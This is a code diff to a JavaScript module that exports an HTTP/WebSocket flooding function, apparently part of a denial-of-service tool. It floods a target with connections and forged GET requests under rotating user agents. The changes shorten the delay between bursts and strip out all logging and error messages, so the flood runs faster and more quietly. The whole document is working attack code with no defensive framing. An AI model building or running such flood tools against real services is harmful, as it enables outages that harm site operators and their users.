@@ -5,7 +5,7 @@ async function httpFlood(target, duration, intensity) {
   const port = url.port || (url.protocol === 'https:' ? 443 : 80);
   const protocol = url.protocol === 'https:' ? 'https' : 'http';
   const startTime = Date.now();
-  const interval = intensity > 100 ? 1 : Math.max(1, 100 / intensity);
+  const interval = Math.max(1, 50 / intensity);
   const userAgents = [
     'Noodles-Bot v1.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
@@ -17,31 +17,23 @@ async function httpFlood(target, duration, intensity) {
   while (Date.now() - startTime < duration * 1000) {
     for (let i = 0; i < intensity; i++) {
       try {
-        const socket = new WebSocket(`${protocol === 'https' ? 'wss' : 'ws'}://${host}:${port}`);
+        const socket = new WebSocket(`${protocol === 'https' ? 'wss' : 'ws'}://${host}:${port}${path}`);
 
         socket.onopen = () => {
           const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-          const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n`;
+          const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\n`;
           socket.send(payload);
-          console.log(`HTTP Flood: Sent request to ${target}`);
         };
 
         socket.onerror = (error) => {
-          console.error(`WebSocket Error: ${error}`);
           socket.close();
         };
 
-        socket.onclose = (event) => {
-          console.log(`WebSocket Closed: ${event.code} ${event.reason}`);
-        };
-      } catch (error) {
-        console.error(`Error sending request: ${error}`);
-      }
+        socket.onclose = () => {};
+      } catch (error) {}
     }
     await new Promise(resolve => setTimeout(resolve, interval));
   }
-
-  console.log(`HTTP Flood completed for ${target}`);
 }
 
 module.exports = { httpFlood };
